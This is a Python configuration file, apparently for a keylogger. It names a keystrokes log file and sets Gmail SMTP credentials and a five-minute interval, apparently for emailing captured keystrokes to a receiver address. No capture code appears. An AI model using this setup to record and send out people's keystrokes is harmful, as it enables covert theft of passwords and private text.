DEBUG = False

# === LOGS SETTINGS ===
LOGS_DIR = "./LOGS" # Directory to store logs
LOGS_FILE = "logs.log" # File to store logs
KEYSTROKES_FILE = "keystrokes.txt" # File to store keystrokes

# === EMAIL SETTINGS ===
SMTP_SERVER= "smtp.gmail.com"  # Replace with your SMTP server
SMTP_PORT = 587  # Use 465 for SSL or 587 for TLS
USERNAME = "" # --------> Your email login,most of the time same with your email address <--------
PASSWORD = "" # --------> Your email password that you get from 'https://myaccount.google.com/apppasswords' <--------
SENDER_EMAIL = "" 
RECEIVER_EMAIL = ""
#! WARNING: Do NOT commit your real credentials to version control!
LOG_INTERVAL = 5 * 60 # Seconds